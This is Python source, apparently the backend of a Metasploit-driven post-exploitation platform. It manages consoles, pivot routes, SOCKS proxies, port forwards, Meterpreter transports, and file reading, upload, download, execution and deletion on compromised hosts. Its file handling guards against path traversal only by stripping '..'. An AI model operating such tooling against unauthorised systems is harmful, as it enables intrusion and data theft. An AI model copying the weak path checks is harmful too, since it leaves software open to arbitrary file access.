    def write(data=None):
        cid = Xcache.get_console_id()

        if cid is None:
            get_active_console_result = Console.get_active_console()
            if get_active_console_result:
                cid = Xcache.get_console_id()
            else:
                return False, None

        params = [cid, data + "\r\n"]
        result = RpcClient.call(Method.ConsoleWrite, params)
        if result is None or result.get("result") == "failure":
            get_active_console_result = Console.get_active_console()
            if get_active_console_result:
                cid = Xcache.get_console_id()
                params = [cid, data + "\r\n"]
                result = RpcClient.call(Method.ConsoleWrite, params)
                if result is None or result.get("result") == "failure":
                    return False, None
                else:
                    return True, result
            else:
                return False, result
        else:
            return True, result

    @staticmethod
    def read():
        cid = Xcache.get_console_id()
        if cid is None:
            return False, {}
        params = [cid]
        result = RpcClient.call(Method.ConsoleRead, params)
        if result is None:
            return False, {}
        elif result.get("result") == "failure":
            logger.warning("Cid: {}错误".format(cid))
            return False, {}
        else:
            return True, result

    @staticmethod
    def tabs(line=None):
        cid = Xcache.get_console_id()
        if cid is None:
            return False, {}
        params = [cid, line]
        result = RpcClient.call(Method.ConsoleTabs, params)
        if result is None or result.get("result") == "failure":
            logger.warning("Cid: {}错误".format(cid))
            return False, {}
        else:
            return True, result

    @staticmethod
    def session_detach():
        cid = Xcache.get_console_id()
        if cid is None:
            return False, {}
        params = [cid]
        result = RpcClient.call(Method.ConsoleSessionDetach, params)
        if result is None:
            return False, {}
        elif result.get("result") == "failure":
            logger.warning("Cid: {}错误".format(cid))
            return False, {}
        else:
            return True, result

    @staticmethod
    def session_kill():
        cid = Xcache.get_console_id()
        if cid is None:
            return False, {}
        params = [cid]
        result = RpcClient.call(Method.ConsoleSessionKill, params)
        if result is None:
            return False, {}
        elif result.get("result") == "failure":
            logger.warning("Cid: {}错误".format(cid))
            return False, {}
        else:
            return True, result


class Route(object):

    @staticmethod
    def get_match_route_for_ipaddress_list(ipaddress_list=None):
        if isinstance(ipaddress_list, list) is not True:
            return None
        if ipaddress_list is []:
            return []
        params = [ipaddress_list]
        result = RpcClient.call(Method.SessionMeterpreterRouteGet, params)

        return result

    @staticmethod
    def list(sessionid=None):
        result = Route.list_route()

        if isinstance(result, list):
            if sessionid is not None or sessionid == -1:
                tmproutes = []
                for route in result:
                    if sessionid == route.get('session'):
                        tmproutes.append(route)

                context = dict_data_return(200, CODE_MSG.get(200), {"route": tmproutes})
                return context
            else:

                context = dict_data_return(200, CODE_MSG.get(200), {"route": result})
                return context
        else:
            logger.warning(result)
            context = dict_data_return(306, Route_MSG.get(306), {})
            return context

    @staticmethod
    def list_route():
        result = RpcClient.call(Method.SessionMeterpreterRouteList)
        if result is None:
            return []
        return result

    @staticmethod
    def create(subnet=None, netmask=None, sessionid=None, autoroute=None):
        if autoroute is True:
            # 调用autoroute
            opts = {'CMD': 'autoadd', 'SESSION': sessionid}
        else:
            opts = {'CMD': 'add', 'SUBNET': subnet, 'NETMASK': netmask, 'SESSION': sessionid}
        result = MSFModule.run(module_type="post", mname="multi/manage/routeapi", opts=opts)
        if result is None:
            context = list_data_return(505, CODE_MSG.get(505), [])
            return context
        try:
            result_dict = json.loads(result)
        except Exception as E:
            logger.warning(E)
            context = list_data_return(306, Route_MSG.get(306), [])
            return context
        if result_dict.get('status') is True:
            if isinstance(result_dict.get('data'), list):
                if autoroute:
                    Notices.send_success(f"新增路由,SID:{sessionid} 自动模式")
                else:
                    Notices.send_success(f"新增路由,SID:{sessionid} {subnet}/{netmask}")

                context = list_data_return(201, Route_MSG.get(201), result_dict.get('data'))
            else:
                context = list_data_return(305, Route_MSG.get(305), [])
            return context
        else:
            context = list_data_return(305, Route_MSG.get(305), [])
            return context

    @staticmethod
    def destory(subnet=None, netmask=None, sessionid=None):
        opts = {'CMD': 'delete', 'SUBNET': subnet, 'NETMASK': netmask, 'SESSION': sessionid}
        result = MSFModule.run(module_type="post", mname="multi/manage/routeapi", opts=opts)
        if result is None:
            context = list_data_return(505, CODE_MSG.get(505), [])
            return context
        try:
            result_dict = json.loads(result)
        except Exception as E:
            logger.warning(E)
            context = dict_data_return(306, Route_MSG.get(306), {})
            return context

        if result_dict.get('status') is True:
            Notices.send_info(f"删除路由,SID:{sessionid} {subnet}/{netmask}")
            context = dict_data_return(204, Route_MSG.get(204), {})
            return context
        else:
            context = dict_data_return(304, Route_MSG.get(304), {})
            return context


class Socks(object):
    """socks代理"""

    @staticmethod
    def list():
        route_list = Route.list_route()
        socks_list = Socks.list_msf_socks()
        portfwds = PortFwd.list_portfwd()
        # 检查host对应的路由信息
        ipaddresses = []
        from Core.core import Host
        hosts = Host.list_hosts()
        for onehost in hosts:
            ipaddresses.append(onehost.get("ipaddress"))
        route_session_list = Route.get_match_route_for_ipaddress_list(ipaddresses)
        if route_session_list is None:
            for host in hosts:
                host['route'] = {'type': 'DIRECT', 'data': None}
        else:
            try:
                for host, route_session in zip(hosts, route_session_list):
                    sessionid = route_session.get('session')
                    if sessionid is None:
                        # TODO 处理socks代理类型
                        host['route'] = {'type': 'DIRECT', 'data': None}
                    else:
                        host['route'] = {'type': 'ROUTE', 'data': sessionid}
            except Exception as E:
                logger.error(E)

        result = {'socks': socks_list, 'routes': route_list, 'portfwds': portfwds, 'hostsRoute': hosts}

        context = dict_data_return(200, CODE_MSG.get(200), result)
        return context

    @staticmethod
    def list_msf_socks():
        from Core.core import Settings
        lhost = Settings.get_lhost()
        socks_list = []
        infos = Job.list_msfrpc_jobs()
        if infos is None:
            return socks_list
        for key in infos.keys():
            info = infos.get(key)
            jobid = int(key)
            if info.get('name') == 'Auxiliary: server/socks4a_api':
                datastore = info.get('datastore')
                if datastore is not None:
                    onesocks4a = {'ID': jobid,
                                  "type": "msf_socks4a",
                                  "lhost": lhost,
                                  "port": datastore.get("SRVPORT"),
                                  'datastore': datastore}
                    socks_list.append(onesocks4a)
            elif info.get('name') == 'Auxiliary: server/socks5_api':
                datastore = info.get('datastore')
                if datastore is not None:
                    onesocks4a = {'ID': jobid,
                                  "type": "msf_socks5",
                                  "lhost": lhost,
                                  "port": datastore.get("SRVPORT"),
                                  'datastore': datastore}
                    socks_list.append(onesocks4a)

        return socks_list

    @staticmethod
    def create(socks_type=None, port=None):
        if socks_type == "msf_socks4a":
            opts = {'SRVHOST': '0.0.0.0', 'SRVPORT': port}

            flag, lportsstr = is_empty_ports(port)
            if flag is not True:
                # 端口已占用
                context = dict_data_return(408, CODE_MSG.get(408), {})
                return context

            result = MSFModule.run(module_type="auxiliary", mname="server/socks4a_api", opts=opts, runasjob=True)
            if isinstance(result, dict) is not True or result.get('job_id') is None:
                opts['job_id'] = None
                context = dict_data_return(303, Socks_MSG.get(303), opts)
            else:
                job_id = int(result.get('job_id'))
                if Job.is_msf_job_alive(job_id):
                    opts['job_id'] = int(result.get('job_id'))
                    Notices.send_success(
                        "新建msf_socks4a代理成功,Port: {}".format(opts.get('SRVPORT'), opts.get('job_id')))
                    context = dict_data_return(201, Socks_MSG.get(201), opts)
                else:
                    context = dict_data_return(306, Socks_MSG.get(306), opts)
            return context
        elif socks_type == "msf_socks5":
            opts = {'SRVHOST': '0.0.0.0', 'SRVPORT': port}
            flag, lportsstr = is_empty_ports(port)
            if flag is not True:
                # 端口已占用
                context = dict_data_return(408, CODE_MSG.get(408), {})
                return context

            result = MSFModule.run(module_type="auxiliary", mname="server/socks5_api", opts=opts, runasjob=True)
            if isinstance(result, dict) is not True or result.get('job_id') is None:
                opts['job_id'] = None
                context = dict_data_return(303, Socks_MSG.get(303), opts)
            else:
                job_id = int(result.get('job_id'))
                if Job.is_msf_job_alive(job_id):
                    opts['job_id'] = int(result.get('job_id'))
                    Notices.send_success(
                        "新建msf_socks5代理成功,Port: {}".format(opts.get('SRVPORT'), opts.get('job_id')))
                    context = dict_data_return(201, Socks_MSG.get(201), opts)
                else:
                    context = dict_data_return(306, Socks_MSG.get(306), opts)
            return context

    @staticmethod
    def destory(socks_type=None, jobid=None):
        if socks_type == "msf_socks4a":
            flag = Job.destroy(jobid)
            if flag:
                if Job.is_msf_job_alive(jobid) is not True:
                    Notices.send_success("删除msf_socks4a代理 JobID:{}".format(jobid))
                    context = dict_data_return(204, Socks_MSG.get(204), {})
                else:
                    context = dict_data_return(304, Socks_MSG.get(304), {})
            else:
                context = dict_data_return(304, Socks_MSG.get(304), {})
            return context
        elif socks_type == "msf_socks5":
            flag = Job.destroy(jobid)
            if flag:
                if Job.is_msf_job_alive(jobid) is not True:
                    Notices.send_success("删除msf_socks5代理 JobID:{}".format(jobid))
                    context = dict_data_return(204, Socks_MSG.get(204), {})
                else:
                    context = dict_data_return(304, Socks_MSG.get(304), {})
            else:
                context = dict_data_return(304, Socks_MSG.get(404), {})
            return context


class PortFwd(object):
    @staticmethod
    def list(sessionid=None):
        result_list = PortFwd.list_portfwd()
        if sessionid is None or sessionid == -1:

            context = list_data_return(200, CODE_MSG.get(200), result_list)
            return context
        else:
            tmplist = []
            try:
                for one in result_list:
                    if one.get('sessionid') == sessionid:
                        tmplist.append(one)
            except Exception as E:
                logger.warning(E)

            context = list_data_return(200, CODE_MSG.get(200), tmplist)
            return context

    @staticmethod
    def list_portfwd():
        result_list = RpcClient.call(Method.SessionMeterpreterPortFwdList)
        if result_list is None:
            return []
        else:
            return result_list

    @staticmethod
    def create(portfwdtype=None, lhost=None, lport=None, rhost=None, rport=None, sessionid=None):
        # 获取不同转发的默认参数
        flag, context = PortFwd._check_host_port(portfwdtype, lhost, lport, rhost, rport)
        if flag is not True:
            return context

        # flag, lportsstr = is_empty_ports(lportint)
        # if flag is not True:
        #       # 端口已占用
        #     context = dict_data_return(CODE, CODE_MSG.get(CODE), {})
        #     return context

        opts = {'TYPE': portfwdtype,
                'LHOST': lhost, 'LPORT': lport, 'RHOST': rhost, 'RPORT': rport,
                'SESSION': sessionid, 'CMD': 'add'}

        result = MSFModule.run(module_type="post", mname="multi/manage/portfwd_api", opts=opts)
        if result is None:
            context = dict_data_return(308, PORTFWD_MSG.get(308), {})
            return context
        try:
            result_dict = json.loads(result)
        except Exception as E:
            logger.warning(E)
            context = list_data_return(301, PORTFWD_MSG.get(301), [])
            return context
        if result_dict.get('status') is True:
            Notices.send_success(f"新增端口转发 SID:{sessionid} {portfwdtype} {lhost}/{lport} {rhost}/{rport}")
            context = dict_data_return(201, PORTFWD_MSG.get(201), result_dict.get('data'))
            return context
        else:
            context = list_data_return(301, PORTFWD_MSG.get(301), [])
            return context

    @staticmethod
    def destory(portfwdtype=None, lhost=None, lport=None, rhost=None, rport=None, sessionid=None):
        if sessionid is not None or sessionid == -1:
            opts = {'TYPE': portfwdtype, 'LHOST': lhost, 'LPORT': lport, 'RHOST': rhost, 'RPORT': rport,
                    'SESSION': sessionid, 'CMD': 'delete'}
            result = MSFModule.run(module_type="post", mname="multi/manage/portfwd_api", opts=opts)
            if result is None:
                context = dict_data_return(308, PORTFWD_MSG.get(308), {})
                return context
            try:
                result_dict = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = list_data_return(302, PORTFWD_MSG.get(302), [])
                return context
            if result_dict.get('status') is True:
                Notices.send_info(f"删除端口转发 SID:{sessionid} {portfwdtype} {lhost}/{lport} {rhost}/{rport}")
                context = dict_data_return(204, PORTFWD_MSG.get(204), result_dict.get('data'))
                return context
            else:
                context = list_data_return(305, PORTFWD_MSG.get(305), [])
                return context
        else:
            context = list_data_return(306, PORTFWD_MSG.get(306), [])
            return context

    @staticmethod
    def _check_host_port(portfwd_type=None, lhost=None, lport=None, rhost=None, rport=None):
        if portfwd_type not in ['Reverse', 'Forward']:
            context = dict_data_return(306, PORTFWD_MSG.get(306), {})
            return False, context
        if lport is None or rport is None:
            context = dict_data_return(306, PORTFWD_MSG.get(306), {})
            return False, context
        if portfwd_type == "Reverse":
            if lhost is None:
                context = dict_data_return(306, PORTFWD_MSG.get(306), {})
                return False, context
        else:
            if rhost is None:
                context = dict_data_return(306, PORTFWD_MSG.get(306), {})
                return False, context
        return True, None


class Transport(object):
    @staticmethod
    def list(sessionid=None):

        if sessionid is None or sessionid == -1:
            context = list_data_return(306, TRANSPORT_MSG.get(306), {})
            return context
        else:
            result_list = Transport.list_transport(sessionid)

            context = dict_data_return(200, CODE_MSG.get(200), result_list)
            return context

    @staticmethod
    def list_transport(sessionid):
        tmp_enum_list = Handler.list_handler_config()
        result_list = RpcClient.call(Method.SessionMeterpreterTransportList, [sessionid])
        if result_list is None:
            transports = []
            return {'session_exp': 0, 'transports': transports, "handlers": tmp_enum_list}
        else:
            result_list["handlers"] = tmp_enum_list
            transports = result_list.get("transports")
            current_transport_url = None
            if len(transports) > 0:
                transports[0]["active"] = True
                current_transport_url = transports[0].get("url")

            i = 0
            for transport in transports:
                transport["tid"] = i
                i += 1
                if transport.get("url") == current_transport_url:
                    transport["active"] = True

                if transport.get("cert_hash") is not None:
                    cert_hash = transport.get("cert_hash")
                    transport["cert_hash"] = base64.b64encode(cert_hash.encode("utf-8"))

            def get_url(data):
                return data.get("url")

            transports.sort(key=get_url)
            return result_list

    @staticmethod
    def create(sessionid=None, handler=None):
        # 获取不同转发的默认参数
        try:
            handleropts = json.loads(handler)
        except Exception as E:
            logger.warning(E)
            context = list_data_return(303, TRANSPORT_MSG.get(303), [])
            return context

        opts = {
            "uuid": None,
            "transport": None,
            "lhost": None,
            "lport": None,
            "ua": None,
            "proxy_host": None,
            "proxy_port": None,
            "proxy_type": None,
            "proxy_user": None,
            "proxy_pass": None,
            "comm_timeout": None,
            "session_exp": None,
            "retry_total": None,
            "retry_wait": None,
            "cert": None,
            "luri": None,

        }

        handler_payload = handleropts.get("PAYLOAD")
        if "reverse_tcp" in handler_payload:
            opts["transport"] = "reverse_tcp"
        elif "reverse_https" in handler_payload:
            opts["transport"] = "reverse_https"
        elif "reverse_http" in handler_payload:
            opts["transport"] = "reverse_http"
        elif "bind_tcp" in handler_payload:
            opts["transport"] = "bind_tcp"
        else:
            context = list_data_return(303, TRANSPORT_MSG.get(303), [])
            return context

        opts["uuid"] = handleropts.get("PayloadUUIDSeed")
        opts["lhost"] = handleropts.get("LHOST")
        opts["lport"] = handleropts.get("LPORT")
        opts["ua"] = handleropts.get("HttpUserAgent")
        opts["proxy_host"] = handleropts.get("HttpProxyHost")
        opts["proxy_port"] = handleropts.get("HttpProxyPort")
        opts["proxy_type"] = handleropts.get("HttpProxyType")
        opts["proxy_user"] = handleropts.get("HttpProxyUser")
        opts["proxy_pass"] = handleropts.get("HttpProxyPass")
        opts["comm_timeout"] = handleropts.get("SessionCommunicationTimeout")
        opts["session_exp"] = handleropts.get("SessionExpirationTimeout")
        opts["retry_total"] = handleropts.get("SessionRetryTotal")
        opts["retry_wait"] = handleropts.get("SessionRetryWait")
        opts["cert"] = handleropts.get("HandlerSSLCert")

        opts["luri"] = handleropts.get("LURI")
        result_flag = RpcClient.call(Method.SessionMeterpreterTransportAdd, [sessionid, opts])
        if result_flag:
            Notices.send_success(f"新增传输 SID:{sessionid}")

            context = dict_data_return(201, TRANSPORT_MSG.get(201), {})
            return context
        else:
            context = list_data_return(301, TRANSPORT_MSG.get(301), [])
            return context

    @staticmethod
    def update(sessionid=None, action=None, sleep=0):
        if sessionid is None or sessionid <= 0:
            context = dict_data_return(306, TRANSPORT_MSG.get(306), {})
            return context
        if action == "next":
            result_flag = RpcClient.call(Method.SessionMeterpreterTransportNext, [sessionid])
        elif action == "prev":
            result_flag = RpcClient.call(Method.SessionMeterpreterTransportPrev, [sessionid])
        elif action == "sleep":
            result_flag = RpcClient.call(Method.SessionMeterpreterTransportSleep, [sessionid, sleep])
            if result_flag:
                reconnect_time = time.time() + sleep
                Notices.send_warn(
                    f'切换Session到休眠 SID:{sessionid} 重连时间: {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(reconnect_time))}')

                context = dict_data_return(203, TRANSPORT_MSG.get(203), {})
                return context
            else:
                context = list_data_return(305, TRANSPORT_MSG.get(305), [])
                return context

        else:
            result_flag = False
        if result_flag:
            Notices.send_info(f"切换传输完成 SID:{sessionid}")
            context = dict_data_return(202, TRANSPORT_MSG.get(202), {})
            return context
        else:
            context = list_data_return(302, TRANSPORT_MSG.get(302), [])
            return context

    @staticmethod
    def destory(query_params):
        opts = {
            "uuid": None,
            "transport": None,
            "lhost": None,
            "lport": None,
            "ua": None,
            "proxy_host": None,
            "proxy_port": None,
            "proxy_type": None,
            "proxy_user": None,
            "proxy_pass": None,
            "comm_timeout": None,
            "session_exp": None,
            "retry_total": None,
            "retry_wait": None,
            "cert": None,
            "luri": None,
        }

        sessionid = query_params.get("sessionid")

        opts["url"] = query_params.get("url")

        result_flag = RpcClient.call(Method.SessionMeterpreterTransportRemove, [sessionid, opts])
        if result_flag:
            Notices.send_info(f"删除传输 SID:{sessionid}")
            context = dict_data_return(204, TRANSPORT_MSG.get(204), {})
            return context
        else:
            context = list_data_return(304, TRANSPORT_MSG.get(304), [])
            return context


class FileMsf(object):
    def __init__(self):
        pass

    @staticmethod
    def list(filename=None, action=None):
        if filename is None:  # 列出所有文件
            result = FileMsf.list_msf_files()
            for one in result:
                one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))

            def sort_files(a, b):
                if a['mtime'] < b['mtime']:
                    return 1
                if a['mtime'] > b['mtime']:
                    return -1
                return 0

            # 根据时间排序
            result_sorted = sorted(result, key=functools.cmp_to_key(sort_files))
            context = list_data_return(200, CODE_MSG.get(200), result_sorted)
            return context
        else:  # 下载文件
            binary_data = FileMsf.read_msf_file(filename)
            if binary_data is None:
                context = dict_data_return(303, FileMsf_MSG.get(303), {})
                return context

            if action == "view":
                b64data = base64.b64encode(binary_data)
                ext = os.path.splitext(filename)[-1]
                if ext in ['.jpeg', '.png', '.jpg']:
                    context = dict_data_return(200, CODE_MSG.get(200), {"type": "img", "data": b64data})
                    return context
                else:
                    context = dict_data_return(200, CODE_MSG.get(200), {"type": "txt", "data": b64data})
                    return context

            response = HttpResponse(binary_data)
            response['Content-Type'] = 'application/octet-stream'
            response['Code'] = 200
            response['Message'] = parse.quote(FileMsf_MSG.get(203))
            # 中文特殊处理
            urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
            leftpart = os.path.splitext(filename)[-1]
            response['Content-Disposition'] = f"{urlpart}{leftpart}"
            return response

    @staticmethod
    def create(file=None):
        result = FileMsf.upload_file_to_msf(file)
        if result is True:
            context = dict_data_return(201, FileMsf_MSG.get(201), {})
        else:
            context = dict_data_return(302, FileMsf_MSG.get(302), {})
        return context

    @staticmethod
    def destory(filename=None):
        result = FileMsf.destory_msf_file(filename)
        if result is True:

            context = dict_data_return(202, FileMsf_MSG.get(202), {})
            return context
        else:

            context = dict_data_return(301, FileMsf_MSG.get(301), {})
            return context

    @staticmethod
    def list_msf_files():
        result = []
        try:
            filelist = os.listdir(MSFLOOT)
            for file in filelist:
                filepath = os.path.join(MSFLOOT, file)
                if os.path.isfile(filepath):
                    fileinfo = os.stat(filepath)
                    enfilename = FileMsf.encrypt_file_name(file)
                    result.append({
                        "name": file,
                        "enfilename": enfilename,
                        "size": fileinfo.st_size,
                        "mtime": int(fileinfo.st_mtime)
                    })
            return result
        except Exception as E:
            logger.exception(E)
            return []

    @staticmethod
    def upload_file_to_msf(file=None):
        try:
            filename = file.name
            filepath = os.path.join(MSFLOOT, filename)
            with open(filepath, "wb+") as f:
                for chunk in file.chunks():
                    f.write(chunk)
            return True
        except Exception as E:
            logger.warning(E)
            return False

    @staticmethod
    def write_msf_file(filename=None, data=None):
        filepath = os.path.join(MSFLOOT, filename)
        with open(filepath, "wb+") as f:
            f.write(data)
        return True

    @staticmethod
    def read_msf_file(filename=None):
        filename = filename.replace("..", "")  # 任意文件读取问题
        filepath = os.path.join(MSFLOOT, filename)
        if os.path.isfile(filepath):
            with open(filepath, "rb+") as f:
                binary_data = f.read()
            return binary_data
        else:
            return None

    @staticmethod
    def destory_msf_file(filename=None):
        filepath = os.path.join(MSFLOOT, filename)
        if os.path.isfile(filepath):
            os.remove(filepath)
            return True
        else:
            return False

    @staticmethod
    def encrypt_file_name(filename):
        key = Xcache.get_aes_key()
        pr = Aescrypt(key, 'ECB', '', 'utf-8')
        en_text = pr.aesencrypt(filename)
        en_text_url = parse.quote(en_text)
        return en_text_url

    @staticmethod
    def decrypt_file_name(enfilename):
        key = Xcache.get_aes_key()
        pr = Aescrypt(key, 'ECB', '', 'utf-8')
        try:
            enfilename_url = parse.unquote(enfilename)
            filename = pr.aesdecrypt(enfilename_url)

            return filename
        except Exception as E:
            logger.exception(E)
            return None

    @staticmethod
    def get_absolute_path(filename, msf=False):
        if msf:
            filepath = f"{MSFLOOTTRUE}/{filename}"
        else:
            filepath = os.path.join(MSFLOOT, filename)
        return filepath


class FileSession(object):
    OPERATION_ENUM = ['upload', 'download', 'list', 'pwd', 'create_dir', 'destory_file', 'destory_dir']  # 可用操作 列表

    def __init__(self):
        pass

    @staticmethod
    def list(sessionid=None, filepath=None, dirpath=None, operation=None, arg=""):

        if operation == "list" and sessionid is not None and dirpath is not None:  # 列目录
            formatdir = FileSession.deal_path(dirpath)
            opts = {'OPERATION': 'list', 'SESSION': sessionid, 'SESSION_DIR': formatdir}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False, timeout=12)
            if result is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            try:
                result = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = dict_data_return(302, FileSession_MSG.get(302), {})
                return context

            if result.get('status') is not True:
                context = dict_data_return(303, FileSession_MSG.get(303), {})
                return context
            else:
                data = result.get('data')
                entries = data.get('entries')
                path = data.get('path')
                for one in entries:
                    if len(one.get('mode').split('/')) > 1:
                        one['format_mode'] = one.get('mode').split('/')[1]
                    else:
                        one['format_mode'] = ''

                    if one.get('total_space') is not None and one.get('free_space') is not None:
                        use_space = one.get('total_space') - one.get('free_space')
                        one['format_size'] = FileSession.get_size_in_nice_string(use_space)
                        one['format_mode'] = '{}|{}'.format(FileSession.get_size_in_nice_string(one.get('free_space')),
                                                            FileSession.get_size_in_nice_string(one.get('total_space')))
                    else:
                        one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))

                    if one.get('size') is None or one.get('size') >= 1024 * 100:
                        one['cat_able'] = False
                    else:
                        one['cat_able'] = True

                    if one.get('type') in ['directory', 'file', 'fixed', "remote"]:
                        one['absolute_path'] = os.path.join(path, one.get('name')).replace('\\\\', '/').replace('\\',
                                                                                                                '/')
                    elif one.get('type') in ['fix', 'cdrom']:
                        one['absolute_path'] = "{}".format(one.get('name'))
                    else:
                        one['absolute_path'] = "{}".format(path)

                context = dict_data_return(200, CODE_MSG.get(200), data)
                return context
        elif operation == 'pwd' and sessionid is not None:  # 列当前目录
            opts = {'OPERATION': 'pwd', 'SESSION': sessionid}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False, timeout=12)
            if result is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            try:
                result = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = dict_data_return(302, FileSession_MSG.get(302), {})
                return context

            if result.get('status') is not True:
                context = dict_data_return(303, FileSession_MSG.get(303), {})
                return context
            else:
                data = result.get('data')
                entries = data.get('entries')
                path = data.get('path')
                for one in entries:
                    one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))
                    if one.get('size') >= 1024 * 100:
                        one['cat_able'] = False
                    else:
                        one['cat_able'] = True
                    if one.get('type') in ['directory', 'file']:

                        one['absolute_path'] = os.path.join(path, one.get('name')).replace('\\\\', '/').replace('\\',
                                                                                                                '/')
                    elif one.get('type') in ['fix', 'cdrom']:
                        one['absolute_path'] = "{}".format(one.get('name'))
                    else:
                        one['absolute_path'] = "{}".format(path)
                    if len(one.get('mode').split('/')) > 1:
                        one['format_mode'] = one.get('mode').split('/')[1]
                    else:
                        one['format_mode'] = ''
                context = dict_data_return(200, CODE_MSG.get(200), data)
                return context
        elif operation == 'download' and sessionid is not None and filepath is not None:  # 下载文件
            opts = {'OPERATION': 'download', 'SESSION': sessionid, 'SESSION_FILE': filepath}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=True)  # 后台运行
            if result is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            else:
                context = dict_data_return(200, CODE_MSG.get(200), result)
                return context
        elif operation == "run":  # 执行文件
            opts = {'OPERATION': 'execute', 'SESSION': sessionid, 'SESSION_FILE': filepath, 'ARGS': arg}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=True)  # 后台运行
            if result is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            else:
                context = dict_data_return(202, FileSession_MSG.get(202), result)
                return context
        elif operation == "cat":  # 查看文件
            opts = {'OPERATION': 'cat', 'SESSION': sessionid, 'SESSION_FILE': filepath}
            moduleresult = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False,
                                         timeout=12)  # 后台运行
            if moduleresult is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            else:
                try:
                    moduleresult = json.loads(moduleresult)
                except Exception as E:
                    logger.warning(E)
                    context = dict_data_return(302, FileSession_MSG.get(302), {})
                    return context

                if moduleresult.get("status"):
                    filedata = base64.b64decode(moduleresult.get("data")).decode("utf-8", 'ignore')
                    result = {"data": filedata, "reason": filepath}
                    context = dict_data_return(200, CODE_MSG.get(200), result)
                    return context
                else:
                    result = {"data": None, "reason": moduleresult.get("message")}
                    context = dict_data_return(303, FileSession_MSG.get(303), result)
                    return context

        elif operation == "cd":  # 查看文件
            formatdir = FileSession.deal_path(dirpath)
            opts = {'OPERATION': 'cd', 'SESSION': sessionid, 'SESSION_DIR': formatdir}
            moduleresult = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False,
                                         timeout=12)  # 后台运行
            if moduleresult is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            else:
                try:
                    moduleresult = json.loads(moduleresult)
                except Exception as E:
                    logger.warning(E)
                    context = dict_data_return(302, FileSession_MSG.get(302), {})
                    return context

                if moduleresult.get("status"):
                    result = {}
                    context = dict_data_return(203, FileSession_MSG.get(203), result)
                    return context
                else:
                    result = {"data": None, "reason": moduleresult.get("message")}
                    context = dict_data_return(303, FileSession_MSG.get(303), result)
                    return context
        else:
            context = dict_data_return(306, FileSession_MSG.get(306), {})
            return context

    @staticmethod
    def create(sessionid=None, filename=None, dirpath=None, operation=None):
        if operation == 'create_dir' and sessionid is not None and dirpath is not None:  # 新建文件夹
            formatdir = FileSession.deal_path(dirpath)
            opts = {'OPERATION': 'create_dir', 'SESSION': sessionid, 'SESSION_DIR': formatdir}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False, timeout=12)
            if result is None:
                context = list_data_return(301, FileSession_MSG.get(301), [])
                return context
            try:
                result = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = dict_data_return(302, FileSession_MSG.get(302), {})
                return context

            if result.get('status') is not True:
                context = list_data_return(303, FileSession_MSG.get(303), [])
                return context
            else:
                context = list_data_return(201, FileSession_MSG.get(201), result.get('data'))
                return context
        # 上传文件
        elif operation == 'upload_file' and sessionid is not None and filename is not None and dirpath is not None:
            formatdir = FileSession.deal_path(dirpath)
            opts = {'OPERATION': 'upload', 'SESSION': sessionid, 'SESSION_DIR': formatdir, 'MSF_FILE': filename}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=True, timeout=12)
            if result is None:
                context = dict_data_return(301, FileSession_MSG.get(301), {})
                return context
            else:
                context = dict_data_return(201, FileSession_MSG.get(201), result)
                return context
        else:
            context = list_data_return(306, FileSession_MSG.get(306), [])
            return context

    @staticmethod
    def update(sessionid, filepath, filedata):
        opts = {'OPERATION': 'update_file', 'SESSION': sessionid, 'SESSION_FILE': filepath, 'FILE_DATA': filedata}
        result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=True, timeout=12)
        if result is None:
            context = dict_data_return(301, FileSession_MSG.get(301), {})
            return context
        else:
            context = dict_data_return(204, FileSession_MSG.get(204), result)
            return context

    @staticmethod
    def destory(sessionid=None, filepath=None, dirpath=None, operation=None):
        if operation == 'destory_file' and sessionid is not None and filepath is not None:
            opts = {'OPERATION': 'destory_file', 'SESSION': sessionid, 'SESSION_FILE': filepath}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False, timeout=12)
            if result is None:
                context = list_data_return(301, FileSession_MSG.get(301), [])
                return context
            try:
                result = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = dict_data_return(302, FileSession_MSG.get(302), {})
                return context
            if result.get('status') is not True:
                context = list_data_return(303, FileSession_MSG.get(303), [])
                return context
            else:
                context = list_data_return(201, FileSession_MSG.get(201), [])
                return context
        elif operation == 'destory_dir':
            formatdir = FileSession.deal_path(dirpath)
            opts = {'OPERATION': 'destory_dir', 'SESSION': sessionid, 'SESSION_DIR': formatdir}
            result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=False, timeout=12)
            if result is None:
                context = list_data_return(301, FileSession_MSG.get(301), [])
                return context
            try:
                result = json.loads(result)
            except Exception as E:
                logger.warning(E)
                context = dict_data_return(302, FileSession_MSG.get(302), {})
                return context
            if result.get('status') is not True:
                context = list_data_return(303, FileSession_MSG.get(303), [])
                return context
            else:
                context = list_data_return(201, FileSession_MSG.get(201), [])
                return context
        else:
            context = dict_data_return(306, FileSession_MSG.get(306), {})
            return context

    @staticmethod
    def get_size_in_nice_string(size_in_bytes=None):
        """
        Convert the given byteCount into a string like: 9.9bytes/KB/MB/GB
        """
        if size_in_bytes is None:
            size_in_bytes = 0
        for (cutoff, label) in [(1024 * 1024 * 1024, "GB"),
                                (1024 * 1024, "MB"),
